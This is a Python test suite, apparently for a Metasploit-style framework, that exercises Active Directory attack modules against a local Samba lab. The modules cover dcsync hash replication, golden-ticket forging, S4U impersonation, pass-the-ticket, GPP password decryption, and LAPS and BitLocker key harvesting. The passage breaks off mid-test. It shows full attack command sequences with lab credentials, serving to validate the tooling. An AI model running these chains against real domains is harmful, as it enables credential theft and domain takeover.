@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestAdPrivilegedLab(unittest.TestCase):
    """ad_privileged against the AD lab (Administrator is adminCount=1)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_finds_protected_accounts(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/ad_privileged",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME analyst",
                    "set PASSWORD Summer2024!",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("Administrator", out)
            self.assertIn("Domain Admins", out)
            # a normal user is not AdminSDHolder-protected
            self.assertNotIn("analyst:", out)
            loot = console.store.loot("ad-privileged")
            self.assertEqual(len(loot), 1)
            self.assertIn("Administrator", loot[0]["content"])
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestGmsaLab(unittest.TestCase):
    """gmsa_dump against the AD lab's gMSA fixture: enumerable, but the
    Samba build constructs no password — the module must say so cleanly."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_enumerates_gmsa_and_retrieval_list(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/gmsa_dump",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("sql_svc", out)
            # retrieval SD resolved to names over LDAP
            self.assertIn("Administrators", out)
            # Samba 4.17 constructs no managed password — honest report
            self.assertIn("not readable", out)
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestLapsLab(unittest.TestCase):
    """laps_dump against the AD lab (schema-extended fixture: WS01 has a
    legacy cleartext password)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_schema_and_password_harvest(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/laps_dump",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("LAPS schema present", out)
            self.assertIn("ws01.forge.local", out)
            self.assertIn("W0rkstation!2024", out)
            creds = console.store.creds()
            self.assertEqual(len(creds), 1)
            self.assertEqual(creds[0]["username"], "Administrator")
            self.assertEqual(creds[0]["password"], "W0rkstation!2024")
            self.assertEqual(len(console.store.loot("laps")), 1)
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestAdPoliciesLab(unittest.TestCase):
    """ad_policies against the AD lab's weak-PSO fixture."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_finds_weak_pso(self):
        # NOTE: run as Administrator — Samba's CN=System ACLs hide PSOs
        # from normal users; on Windows any authenticated user can read
        # them (documented in the module docstring)
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/ad_policies",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("WeakServicePSO", out)
            self.assertIn("min length 4", out)
            self.assertIn("Helpdesk", out)
            loot = console.store.loot("ad-pso")
            self.assertEqual(len(loot), 1)
            self.assertIn("WeakServicePSO", loot[0]["content"])
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestAdMisconfigLab(unittest.TestCase):
    """ad_misconfig against the AD lab (MAQ default + PASSWD_NOTREQD
    fixture on noauth)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_battery_finds_fixtures(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/ad_misconfig",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME analyst",
                    "set PASSWORD Summer2024!",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("MachineAccountQuota = 10", out)
            self.assertIn("PASSWD_NOTREQD: noauth", out)
            # Samba's pre2k group ships with Authenticated Users
            # (S-1-5-11) — a genuine legacy-exposure finding
            self.assertIn("Pre-Windows 2000 Compatible Access: S-1-5-11", out)
            loot = console.store.loot("ad-misconfig")
            self.assertEqual(len(loot), 1)
            self.assertIn("noauth", loot[0]["content"])
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestAdInfraLab(unittest.TestCase):
    """ad_infra against the AD lab (subnet fixture)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_maps_infrastructure(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/ad_infra",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME analyst",
                    "set PASSWORD Summer2024!",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("domain controllers:", out)
            self.assertIn("forge.local", out)
            self.assertIn("Default-First-Site-Name", out)
            self.assertIn("subnet 10.10.10.0/24 -> Default-First-Site-Name", out)
            loot = console.store.loot("ad-infra")
            self.assertEqual(len(loot), 1)
            self.assertIn("10.10.10.0/24", loot[0]["content"])
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestLdapSecurityLab(unittest.TestCase):
    """ldap_security against the AD lab (Samba default: strong auth not
    required — the relay-friendly answer)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_reports_signing_not_required(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/ldap_security",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME analyst",
                    "set PASSWORD Summer2024!",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("signing NOT required", out)
            self.assertIn("no LDAPS", out)
            loot = console.store.loot("ldap-security")
            self.assertEqual(len(loot), 1)
            self.assertIn("NOT required", loot[0]["content"])
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestAdcsLab(unittest.TestCase):
    """adcs_enum against the AD lab's planted template fixtures."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_flags_esc1_template(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/adcs_enum",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME analyst",
                    "set PASSWORD Summer2024!",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("VulnWeb: ESC1", out)
            self.assertIn("client auth", out)
            self.assertIn("1 ESC1-shaped", out)
            # the sane template is not flagged
            self.assertNotIn("SafeMachine: ESC1", out)
            # no real CA in the lab — the module says so
            self.assertIn("no enterprise CAs", out)
            loot = console.store.loot("adcs")
            self.assertEqual(len(loot), 1)
            self.assertIn("VulnWeb", loot[0]["content"])
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestGppPasswordLab(unittest.TestCase):
    """gpp_password against the AD lab's SYSVOL Groups.xml fixture."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_decrypts_sysvol_cpassword(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/gpp_password",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME analyst",
                    "set PASSWORD Summer2024!",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("svc_localadmin : GPP2024!Secret", out)
            creds = console.store.creds()
            self.assertEqual(len(creds), 1)
            self.assertEqual(creds[0]["username"], "svc_localadmin")
            self.assertEqual(creds[0]["password"], "GPP2024!Secret")
            self.assertEqual(len(console.store.loot("gpp-password")), 1)
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestBitlockerLab(unittest.TestCase):
    """bitlocker_keys against the AD lab's WS01 recovery-key fixture."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_finds_recovery_key(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/bitlocker_keys",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("WS01", out)
            self.assertIn("123456-234567", out)
            loot = console.store.loot("bitlocker-keys")
            self.assertEqual(len(loot), 1)
            self.assertIn("WS01", loot[0]["content"])
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestGoldenTicketLab(unittest.TestCase):
    """The full AD arc end to end: dcsync the krbtgt hash, forge a TGT,
    and have the KDC accept it for a service ticket."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            out = buf.getvalue()
            loot = {}
            for kind in ("hash", "ticket", "kerberos-key", "cleartext"):
                loot[kind] = console.store.loot(kind)
            return out, loot
        finally:
            console.store.close()

    def test_dcsync_to_golden_ticket(self):
        # 1. dcsync -> krbtgt NT hash + AES key (Samba's krbtgt is
        # AES256-only, so the AES forge is what gets validated)
        out, loot = self._run(
            "use auxiliary/attack/dcsync",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME Administrator",
            "set PASSWORD P@ssw0rd123",
            "set TARGET krbtgt",
            "run",
        )
        hashes = loot["hash"]
        self.assertEqual(len(hashes), 1)
        self.assertIn("krbtgt", hashes[0]["content"])
        keys = loot["kerberos-key"]
        self.assertTrue(keys, "dcsync must capture kerberos AES keys")
        aes_line = next(k["content"] for k in keys
                        if "aes256-cts-hmac-sha1-96" in k["content"])
        aes_key = aes_line.rsplit(":", 1)[1]

        # 2. domain SID from Administrator's objectSid (strip the RID)
        from impacket.ldap import ldap as impacket_ldap
        from impacket.ldap import ldapasn1, ldaptypes
        conn = impacket_ldap.LDAPConnection(f"ldap://{HOST}")
        conn.login("Administrator", "P@ssw0rd123", "forge.local")
        domain_sid = None
        for packet in conn.search(
                searchBase="DC=forge,DC=local",
                searchFilter="(sAMAccountName=Administrator)",
                attributes=["objectSid"]):
            if isinstance(packet, ldapasn1.SearchResultEntry):
                for attr in packet["attributes"]:
                    if str(attr["type"]) == "objectSid":
                        sid = ldaptypes.LDAP_SID(
                            data=bytes(attr["vals"][0])).formatCanonical()
                        domain_sid = sid.rsplit("-", 1)[0]
        self.assertIsNotNone(domain_sid)

        # 3. forge + validate: the KDC must accept the golden ticket
        out, loot = self._run(
            "use auxiliary/attack/golden_ticket",
            "set DOMAIN forge.local",
            f"set DOMAIN_SID {domain_sid}",
            "set KEYTYPE aes256",
            f"set KRBTGT_AES {aes_key}",
            "set KVNO 1",  # Samba provisions krbtgt at kvno 1
            f"set RHOSTS {HOST}",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("forged:", out)
        self.assertIn("KDC issued a service ticket", out)
        tickets = loot["ticket"]
        self.assertEqual(len(tickets), 1)
        self.assertIn("golden Administrator", tickets[0]["label"])


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestS4ULab(unittest.TestCase):
    """s4u against the AD lab: web_svc (protocol-transition delegation to
    HTTP/api.forge.local) impersonates Administrator end to end."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.loot("ticket")
        finally:
            console.store.close()

    def test_full_chain(self):
        out, tickets = self._run(
            "use auxiliary/attack/s4u",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME web_svc",
            "set PASSWORD Web2024!",
            "set SPN HTTP/api.forge.local",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("S4U2self ticket issued to Administrator", out)
        self.assertIn("Administrator -> HTTP/api.forge.local", out)
        self.assertEqual(len(tickets), 1)
        self.assertIn("s4u Administrator -> HTTP/api.forge.local",
                      tickets[0]["label"])

    def test_no_delegation_clean_denial(self):
        # analyst holds no T2A4D flag — Samba masks the policy denial as
        # S_PRINCIPAL_UNKNOWN; either way it must fail clean, no loot
        out, tickets = self._run(
            "use auxiliary/attack/s4u",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "set SPN HTTP/api.forge.local",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("S4U2self denied", out)
        self.assertEqual(tickets, [])


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestPassTheTicketLab(unittest.TestCase):
    """pass_the_ticket: the golden ticket's ccache loot is a LIVE
    credential — dcsync -> forge -> request a real service ticket."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            out = buf.getvalue()
            loot = {}
            for kind in ("ticket", "kerberos-key"):
                loot[kind] = console.store.loot(kind)
            return out, loot
        finally:
            console.store.close()

    def test_forged_ccache_requests_service_ticket(self):
        import base64
        import tempfile

        # 1. dcsync -> krbtgt AES key
        _, loot = self._run(
            "use auxiliary/attack/dcsync",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME Administrator",
            "set PASSWORD P@ssw0rd123",
            "set TARGET krbtgt",
            "run",
        )
        aes_line = next(k["content"] for k in loot["kerberos-key"]
                        if "aes256-cts-hmac-sha1-96" in k["content"])
        aes_key = aes_line.rsplit(":", 1)[1]

        # 2. domain SID via LDAP
        from impacket.ldap import ldap as impacket_ldap
        from impacket.ldap import ldapasn1, ldaptypes
        conn = impacket_ldap.LDAPConnection(f"ldap://{HOST}")
        conn.login("Administrator", "P@ssw0rd123", "forge.local")
        domain_sid = None
        for packet in conn.search(
                searchBase="DC=forge,DC=local",
                searchFilter="(sAMAccountName=Administrator)",
                attributes=["objectSid"]):
            if isinstance(packet, ldapasn1.SearchResultEntry):
                for attr in packet["attributes"]:
                    if str(attr["type"]) == "objectSid":
                        sid = ldaptypes.LDAP_SID(
                            data=bytes(attr["vals"][0])).formatCanonical()
                        domain_sid = sid.rsplit("-", 1)[0]
        self.assertIsNotNone(domain_sid)

        # 3. forge -> ccache loot (sniff the magic to prove the format)
        out, loot = self._run(
            "use auxiliary/attack/golden_ticket",
            "set DOMAIN forge.local",
            f"set DOMAIN_SID {domain_sid}",
            "set KEYTYPE aes256",
            f"set KRBTGT_AES {aes_key}",
            "set KVNO 1",
            f"set RHOSTS {HOST}",
            "run",
        )
        self.assertNotIn("Traceback", out)
        ticket_b64 = loot["ticket"][-1]["content"]
        blob = base64.b64decode(ticket_b64)
        self.assertEqual(blob[:2], b"\x05\x04", "loot must be ccache format")

        # 4. pass it: the KDC must issue a service ticket for the forge
        with tempfile.NamedTemporaryFile(suffix=".ccache", delete=False) as tf:
            outfile = tf.name
        out, loot = self._run(
            "use auxiliary/attack/pass_the_ticket",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            f"set TICKET {ticket_b64}",
            "set TARGET_SPN HTTP/api.forge.local",
            f"set OUTFILE {outfile}",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("KDC issued Administrator -> HTTP/api.forge.local", out)
        self.assertIn("written to", out)
        ptt_loot = [t for t in loot["ticket"] if t["label"].startswith("ptt ")]
        self.assertEqual(len(ptt_loot), 1)

        # 5. OUTFILE is a parseable ccache holding the krbtgt TGT
        from impacket.krb5.ccache import CCache
        cc = CCache.loadFile(outfile)
        servers = ["/".join(c["data"].decode() for c in cred["server"].components)
                   for cred in cc.credentials]
        self.assertTrue(any(s.startswith("krbtgt/") for s in servers))

    def test_refuses_raw_asrep(self):
        import base64
        raw = base64.b64encode(b"\x6b\x82\x01\x00fake-asrep").decode()
        out, _ = self._run(
            "use auxiliary/attack/pass_the_ticket",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            f"set TICKET {raw}",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("no session key", out)

    def test_bad_base64_clean_error(self):
        out, _ = self._run(
            "use auxiliary/attack/pass_the_ticket",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set TICKET !!!not-base64!!!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("not valid base64", out)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestAdProbeAdLab(unittest.TestCase):
    """ad_probe against the AD lab (Samba): signing posture, names, LDAP
    rootDSE, realm confirmation, RPC interfaces, loot."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_profile_samba_dc(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/scanner/ad_probe",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("SMB signing required", out)
            self.assertIn("dns=forge.local", out)
            self.assertIn("DC=forge,DC=local", out)
            self.assertIn("clock skew +", out)
            self.assertIn("KDC realm forge.local", out)
            self.assertIn("rpc SAMR", out)
            self.assertIn("anonymous bind works", out)
            loot = console.store.loot("ad-probe")
            self.assertEqual(len(loot), 1)
            self.assertIn("profile @", loot[0]["label"])
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestAddComputerRbcdLab(unittest.TestCase):
    """add_computer + rbcd against the AD lab: machine-account lifecycle
    works; the RBCD write path reports Samba's system-only refusal
    cleanly; rbcd get parses the fixture SD."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)
        # ad-state persists Samba's database across runs — a previously
        # interrupted lifecycle leaves FZTEST02$ behind and the create
        # below then fails with STATUS_USER_EXISTS. Clear it first
        # (deleting a missing account just errors; ignored).
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            with contextlib.redirect_stdout(io.StringIO()):
                for command in (
                    "use auxiliary/attack/add_computer",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "set COMPUTER_NAME FZTEST02$",
                    "set DELETE true",
                    "run",
                ):
                    console.onecmd(command)
        finally:
            console.store.close()

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.creds()
        finally:
            console.store.close()

    def test_machine_account_lifecycle(self):
        out, creds = self._run(
            "use auxiliary/attack/add_computer",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME Administrator",
            "set PASSWORD P@ssw0rd123",
            "set COMPUTER_NAME FZTEST02$",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("created FZTEST02$", out)
        self.assertIn("authenticates", out)
        self.assertTrue(any(c["username"] == "FZTEST02$" for c in creds))
        out, _ = self._run(
            "use auxiliary/attack/add_computer",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME Administrator",
            "set PASSWORD P@ssw0rd123",
            "set COMPUTER_NAME FZTEST02$",
            "set DELETE true",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("deleted", out)

    def test_analyst_privilege_denial_clean(self):
        out, _ = self._run(
            "use auxiliary/attack/add_computer",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("doesn't have the right", out)

    def test_rbcd_get_parses_fixture_sd(self):
        out, _ = self._run(
            "use auxiliary/attack/rbcd",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME Administrator",
            "set PASSWORD P@ssw0rd123",
            "set ACTION get",
            "set TARGET backup_svc",
            "run",
        )
        self.assertNotIn("Traceback", out)
        # web_svc's SID is in backup_svc's RBCD SD (fixture 20) — the RID
        # shifts with provision order, so look it up live
        from impacket.ldap import ldap as impacket_ldap
        from impacket.ldap import ldapasn1
        conn = impacket_ldap.LDAPConnection(f"ldap://{HOST}")
        conn.login("Administrator", "P@ssw0rd123", "forge.local")
        sid = None
        for packet in conn.search(
                searchBase="DC=forge,DC=local",
                searchFilter="(sAMAccountName=web_svc)",
                attributes=["objectSid"]):
            if isinstance(packet, ldapasn1.SearchResultEntry):
                for a in packet["attributes"]:
                    if str(a["type"]) == "objectSid":
                        from impacket.ldap.ldaptypes import LDAP_SID
                        sid = LDAP_SID(bytes(a["vals"][0])).formatCanonical()
        conn.close()
        self.assertIsNotNone(sid)
        self.assertIn(sid, out)

    def test_rbcd_set_system_only_denial(self):
        out, _ = self._run(
            "use auxiliary/attack/rbcd",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME Administrator",
            "set PASSWORD P@ssw0rd123",
            "set ACTION set",
            "set TARGET WS01$",
            "set PRINCIPAL_SID S-1-5-21-140191133-2678393782-739835184-1116",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("system-only", out)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestDcSyncLab(unittest.TestCase):
    """dcsync against the AD lab: Administrator replicates the directory.
    Exercises the pinned RPC range (135 + 49152-49160) end to end."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.loot("hash")
        finally:
            console.store.close()

    def test_syncs_directory_hashes(self):
        out, hashes = self._run(
            "use auxiliary/attack/dcsync",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME Administrator",
            "set PASSWORD P@ssw0rd123",
            "run",
        )
        self.assertNotIn("Traceback", out)
        labels = " ".join(h["label"] for h in hashes)
        contents = "\n".join(h["content"] for h in hashes)
        for name in ("Administrator", "krbtgt", "analyst", "backup_svc"):
            self.assertIn(name, labels)
        # hashcat NTLM format: user:rid:lm:nt:::
        self.assertRegex(contents,
                         r"Administrator:500:[0-9a-f]{32}:[0-9a-f]{32}:::")
        # and the replicated hash is REAL — analyst's NT(Summer2024!)
        from Cryptodome.Hash import MD4
        expected = MD4.new("Summer2024!".encode("utf-16-le")).hexdigest()
        self.assertIn(expected, contents)

    def test_target_limits_sync(self):
        out, hashes = self._run(
            "use auxiliary/attack/dcsync",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME Administrator",
            "set PASSWORD P@ssw0rd123",
            "set TARGET krbtgt",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertEqual(len(hashes), 1)
        self.assertIn("krbtgt", hashes[0]["label"])

    def test_low_priv_user_denied(self):
        # analyst holds no replication rights — clean failure, zero hashes
        out, hashes = self._run(
            "use auxiliary/attack/dcsync",
            f"set RHOSTS {HOST}",
            "set DOMAIN forge.local",
            "set USERNAME analyst",
            "set PASSWORD Summer2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertEqual(hashes, [])


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestDomainDcLab(unittest.TestCase):
    """domain lab, DC half only: proves the composed topology (build from
    ../ad, fixed-IP network, 1:1 AD bindings) without paying the member's
    ~20 min Windows install — that's TestDomainFullLab's job."""

    @classmethod
    def setUpClass(cls):
        from impacket.ldap import ldap as impacket_ldap

        cls.manager = LabManager(ROOT / "labs")
        # start ONLY the dc service (member excluded on purpose)
        cls.manager._compose_run("domain", "up", "-d", "--build", "dc")
        deadline = time.time() + 120
        while time.time() < deadline:
            try:
                conn = impacket_ldap.LDAPConnection("ldap://127.0.0.1")
                conn.login("Administrator", "P@ssw0rd123", "forge.local")
                break
            except Exception:
                time.sleep(2)
        else:
            cls.manager.down("domain")
            raise RuntimeError("domain DC did not provision within 120s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("domain")

    def test_dc_collates_domain(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
